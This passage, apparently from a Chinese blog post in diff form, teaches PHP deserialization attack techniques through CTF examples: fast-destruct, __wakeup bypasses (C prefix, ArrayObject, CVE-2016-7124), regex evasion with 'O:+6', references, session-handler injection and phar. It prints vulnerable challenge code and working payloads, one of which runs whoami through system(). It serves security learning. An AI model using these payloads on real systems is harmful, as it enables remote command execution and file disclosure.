+<p>2022年中国工业互联网安全大赛预选赛里有道wakeup题就是运用了这个知识点，具体可以看<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1936">2022年中国工业互联网安全大赛北京市选拔赛暨全国线上预选赛-Writeup</a>，这道题用了很巧妙的方法绕过了死亡wakeup最后构造了命令。</p>
+<h2 id="3-fast-destruct"><a href="#3-fast-destruct" class="headerlink" title="3.fast-destruct"></a>3.fast-destruct</h2><p>在PHP中如果单独执行<code>unserialize()</code>函数，则反序列化后得到的生命周期仅限于这个函数执行的生命周期，在执行完unserialize()函数时就会执行<code>__destruct()</code>方法</p>
+<p>而如果将<code>unserialize()</code>函数执行后得到的字符串赋值给了一个变量，则反序列化的对象的生命周期就会变长，会一直到对象被销毁才执行析构方法</p>
+<h3 id="快速析构的原理："><a href="#快速析构的原理：" class="headerlink" title="快速析构的原理："></a>快速析构的原理：</h3><p>当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功；</p>
+<p>但是由于给的是一个畸形的反序列化字符串，是不标准的，php对这个畸形序列化字符串得到的对象不放心，会赶紧把该对象清除掉，就会触发其析构方法。</p>
+<p>这样就会提前触发析构方法，不需要等到所用语句都执行结束，也就可以避免一些安全检查方法的调用。</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212747612.png" alt="202303181053863"></p>
+<p>一种方式就是修改序列化字符串的结构，使得完成部分反序列化的unserialize强制退出，提前触发__destruct，其中的几种方式如下:</p>
+<p>1.修改序列化元素个数数字</p>
+<p>2.去掉序列化尾部 }</p>
+<p>正常反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">    public function __call($f,$p) &#123;</span><br><span class="line">        echo &quot;B::__call($f,$p)\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;B::__destruct\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo &quot;B::__wakeup\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;A::__destruct\n&quot;;</span><br><span class="line">        $this-&gt;b-&gt;c();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212747726.png" alt="image-20250110171257138"></p>
+<p>可以看到先对B类进行一个<code>__wakeup</code>,然后A<code>destruct</code>然后是对B类的操作</p>
+<h2 id="4-php-issue-9618"><a href="#4-php-issue-9618" class="headerlink" title="4.php issue#9618"></a>4.php issue#9618</h2><p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/issues/9618">php issue#9618</a>提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在__wakeup之前调用__destruct()函数，最后绕过__wakeup()，版本：</p>
+<ul>
+<li>7.4.x -7.4.30</li>
+<li>8.0.x</li>
+</ul>
+<h2 id="5-使用C绕过"><a href="#5-使用C绕过" class="headerlink" title="5.使用C绕过"></a>5.使用C绕过</h2><p>当使用C代替O来标识对象类型时，反序列化将创建一个新的类而不是对象，因为新的类没有被序列化过，所以它没有任何属性或方法，<code>__wakeup魔术方法和__destruct</code>也就不会自动调用。但是，这种方法的缺点是，如果在原先的利用链中需要使用类的属性这个方法就行不通了。</p>
+<p>例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = $_GET[&#x27;1+1&gt;2&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ctfshow&#123;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$a=new ctfshow();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212747804.png" alt="image-20250110195727248"></p>
+<p>把O改成C</p>
+<p><code>C:7:&quot;ctfshow&quot;:0:{}</code></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212747837.png" alt="image-20250110200021573"></p>
+<p>使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了</p>
+<p>我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头</p>
+<p>例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow &#123;</span><br><span class="line">    public $ctfshow;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        die(&quot;not allowed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;OK&quot;;</span><br><span class="line">        system($this-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$data = $_GET[&#x27;1+1&gt;2&#x27;];</span><br><span class="line"></span><br><span class="line">if(!preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $data))&#123;</span><br><span class="line">    unserialize($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class ctfshow &#123;</span><br><span class="line">    public $ctfshow;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new ctfshow;</span><br><span class="line">$a-&gt;ctfshow=&quot;whoami&quot;;</span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$oa=new ArrayObject($arr);</span><br><span class="line">$res=serialize($oa);</span><br><span class="line">echo $res;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212748257.png" alt="image-20250110200955004"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212748335.png" alt="image-20250110201351578"></p>
+<h1 id="三-bypass反序列化正则"><a href="#三-bypass反序列化正则" class="headerlink" title="三.bypass反序列化正则"></a>三.bypass反序列化正则</h1><p>当执行反序列化时,使用正则<code>/[oc]:\d+:/i</code>进行拦截,主要拦截了这类反序列化字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是反序列化中最常见的一种形式,那么如何进行绕过呢?通过对PHP的unserialize()函数进行分析,发现PHP内核中最后使用php_var_unserialize进行解析</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212748678.png" alt="image-20250108150806542"></p>
+<p>上面的代码主要是解析’O’:语句段,跟入yy17段中,还会存在对+的判断.所以,如果输入<code>O:+6:&quot;secret&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>,可以看到当’O:’后面为+时,就会从yy17跳到yy19处理,然后继续对+后面的数字进行判断,意味着这是支持+来表达数字,从而对上面的正则进行绕过</p>
+<h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class secret&#123;</span><br><span class="line">    var $file=&#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        include_once($this-&gt;file);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;file=&#x27;index.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($cmd))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;</span><br><span class="line">        echo &quot;Are you daydreaming?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        unserialize($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//sercet in flag.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>因为__wakeup()在反序列化unserialize()之前</p>
+<p>​       __destruct()在反序列化unserialize()之后</p>
+<p>所以只要触发了__wakeup()魔术方法就会导致file的值变为index.php</p>
+<p>所以需要绕过<code>__wakeup()</code>触发<code>__destruct()</code></p>
+<p>只需要在本地构造一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class secret</span><br><span class="line">&#123;</span><br><span class="line">    var $file = &#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new secret);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212748565.png" alt="image-20250108145709112"></p>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;secret&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是题目中有一个正则表达式,要求O后面不能是数字,所以把6改为+6</p>
+<p>同时利用漏洞CVE-2016-7124把成员属性数增多来绕过__wakeup()魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意:通过URL编码后再提交,有时候+会被解析成空格(大概)</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212748606.png" alt="image-20250108150138146"></p>
+<h1 id="四-PHP引用"><a href="#四-PHP引用" class="headerlink" title="四.PHP引用"></a>四.PHP引用</h1><p>PHP中存在引用,通过”&amp;”表示,其中”&amp;$a”引用了”$a”的值,即在内存中是指向变量的地址,在序列化字符串中则用R来表示引用类型</p>
+<p>类似于快捷方式</p>
+<p>例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pass&#x27;])) &#123;</span><br><span class="line">    $pass = $_GET[&#x27;pass&#x27;];</span><br><span class="line">    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">if ($o) &#123;</span><br><span class="line">    $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">    if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">        echo &quot;Congratulation! Here is my secret: &quot;.$flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Oh no... You can&#x27;t fool me&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else echo &quot;are you trolling?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最终的目标是达成$o-&gt;secret &#x3D;&#x3D;&#x3D; $o-&gt;enter</p>
+<p>不止是这道题告诉你secret的值了,如果推广一下,不告诉你secret的值,该如何实现呢?</p>
+<p>这个时候就需要用到PHP中的引用了</p>
+<p>本地配置代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new just4fun();</span><br><span class="line">$a -&gt; enter = &amp;$a -&gt; secret;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+
+<p>利用&amp;将enter指向secret的地址,最终生成利用字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>s:6:&quot;secret&quot;;R:2;</code>,即通过引用的方式将两者的属性值成为同一个值</p>
+<p>R代表引用</p>
+<p>2代表第二次出现的值,即enter的值</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212748671.png" alt="image-20250108154239919"></p>
+<h1 id="五-Session反序列化"><a href="#五-Session反序列化" class="headerlink" title="五.Session反序列化"></a>五.Session反序列化</h1><p>当session_start()被调用或者php.ini中session_auto_start为1时,php内部调用会话管理器,访问用户session被序列化以后,存储到指定目录(默认为&#x2F;tmp)</p>
+<p>存取数据的格式有多种,常用的有三种</p>
+<p>漏洞产生的原因:写入格式和读取格式不一致</p>
+<p><strong>当存储是php_serialize处理，然后调用时php去处理</strong><br>如果这时候注入的数据是<code>a=|O:4:&quot;test&quot;:0:{}</code><br>那么session中的内容是<code>a:1:{s:1:&quot;a&quot;;s:16:&quot;|O:4:&quot;test&quot;:0:{}&quot;;}</code><br>根据解释,其中<code>a:1:{s:1:&quot;a&quot;;s:16:&quot;</code>在经过php解析后是被看成键名,后面就是一个实例化test对象的注入</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212749106.png" alt="image-20250108154940812"></p>
+<h3 id="默认情况下用php格式储存"><a href="#默认情况下用php格式储存" class="headerlink" title="默认情况下用php格式储存"></a>默认情况下用php格式储存</h3><p>lulu|s:5:”lu1ux”;</p>
+<h3 id="声明存储类型为php-serialize"><a href="#声明存储类型为php-serialize" class="headerlink" title="声明存储类型为php_serialize"></a>声明存储类型为php_serialize</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_hander&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;benben&#x27;] = $_GET[&#x27;ben&#x27;];</span><br><span class="line">$_SESSION[&#x27;b&#x27;] = $_GET[&#x27;b&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>传入?ben&#x3D;lulu&amp;b&#x3D;lu1ux</p>
+<p>a:2:{s:6:”benben”;s:4:”lulu”;s:1:”b”;s:5:”lu1ux”;}</p>
+<h3 id="声明存储类型为php-binary"><a href="#声明存储类型为php-binary" class="headerlink" title="声明存储类型为php_binary"></a>声明存储类型为php_binary</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_hander&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212749141.png" alt="image-20250108162127231"></p>
+<p>session反序列化的条件</p>
+<p>一个页面写入,一个页面读取,且写入和读取的两个页面类型不一样</p>
+<h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*hint.php*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>hint.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现题目是一道很简单的通过引用来使<code>$this-&gt;name===$this-&gt;her</code>为真的反序列化题目,但是题目没有提交的点,而且没有unserialize()根据hint知道是读取hint.php页面GET上传的a</p>
+<p>先构造正常的引用的反序列化字符串</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212749262.png" alt="image-20250108164417354"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现传入的类型是php_serialize,读取的类型是php</p>
+<p>于是payload需要加上|</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212749347.png"></p>
+<h1 id="六-phar反序列化漏洞"><a href="#六-phar反序列化漏洞" class="headerlink" title="六.phar反序列化漏洞"></a>六.phar反序列化漏洞</h1><p>JAR是开发Java程序一个应用,包括所有的可执行文件,可访问的文件,都打包进了一个JAR文件里,使得部署过程十分简单.</p>
+<p>PHAR(“php ARchive”)是php里类似于JAR的一种打包文件.对于PHP5.3或更高版本,Phar后缀文件是默认开启支持的,可以直接使用它</p>
+<p>文件包含:phar伪协议,可读取.phar文件</p>
+<h3 id="Phar结构"><a href="#Phar结构" class="headerlink" title="Phar结构"></a>Phar结构</h3><p>stub phar 文件标识,格式为<code>xxx&lt;?php xxx;__HALT_COMPiLER();?&gt;;</code>(头部信息)</p>
+<p><strong>manifest</strong>压缩文件的属性等信息,以<strong>序列化</strong>存储;</p>
+<p>contents压缩文件的内容;</p>
+<p>Phar协议解析文件时,会自动触发对<strong>manifest字段</strong>的序列化字符进行<strong>反系列化</strong></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212749514.png" alt="image-20250108202131373"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212749538.png"></p>
+<h2 id="Phar漏洞原理"><a href="#Phar漏洞原理" class="headerlink" title="Phar漏洞原理"></a>Phar漏洞原理</h2><p>manifest压缩文件的属性等信息,以序列化存储;存在一段序列化的字符串</p>
+<p>调用phar伪协议,可读取.phar文件;</p>
+<p>Phar协议解析文件时,会自动触发对manifest字段的序列化字符串进行反序列化</p>
+<p>Phar需要PHP&gt;&#x3D;5.2且在php.ini中将phar.readonly设为off(注意去掉前面的分号)</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212750012.png" alt="image-20250108203342285"></p>
+<h2 id="Phar使用条件"><a href="#Phar使用条件" class="headerlink" title="Phar使用条件"></a>Phar使用条件</h2><ol>
+<li><p>phar文件能上传到服务器端; (一般只要有上传点就能实现)</p>
+</li>
+<li><p>要有可用反序列化魔术方法作为跳板;</p>
+</li>
+<li><p>要有文件操作函数,如<code>file_exists(),fopen(),file_get_contents()</code>等</p>
+</li>
+<li><p>文件操作函数参数可控,且<code>:</code> <code>/</code> <code>phar</code>等特殊字符没有被过滤</p>
+</li>
+</ol>
+<p>注:</p>
+<ol>
+<li><p>Phar文件上传的文件名后缀没有要求,例如上传test.phar和上传test.png效果是一样的,,上传的如果是test.phar,就是<code>?filename=phar://test.phar</code></p>
+<p>如果上传的是test.png,就是<code>?filename=phar://test.png</code></p>
+</li>
+<li><p>需要<code>__destruct()</code>或者<code>__wakeup()</code>魔术方法做跳板,不然phar文件只是进行一个反序列化,不会有任何其他操作</p>
+</li>
+<li><p>4.即文件操作函数中的函数不是写死的</p>
+</li>
+</ol>
